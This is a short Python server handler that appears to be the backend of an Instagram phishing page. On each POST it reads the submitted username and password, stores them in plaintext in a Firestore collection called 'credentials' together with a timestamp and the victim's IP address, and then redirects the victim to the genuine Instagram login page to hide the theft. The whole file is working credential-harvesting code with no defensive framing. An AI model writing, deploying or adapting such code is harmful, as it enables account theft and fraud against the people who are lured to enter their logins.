from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, firestore
import os
import json

# Initialize Firebase
def initialize_firebase():
    firebase_config = os.environ.get('FIREBASE_CONFIG')
    if not firebase_config:
        raise ValueError("No Firebase config found in environment variables")
    cred = credentials.Certificate(json.loads(firebase_config))
    if not firebase_admin._apps:
        firebase_admin.initialize_app(cred)
    return firestore.client()

db = initialize_firebase()

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)
        
        username = form_data.get('username', [''])[0]
        password = form_data.get('password', [''])[0]
        
        if username and password:
            doc_ref = db.collection('credentials').document()
            doc_ref.set({
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'ip_address': self.headers.get('X-Forwarded-For', self.client_address[0])
            })
        
        self.send_response(302)
        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
        self.end_headers()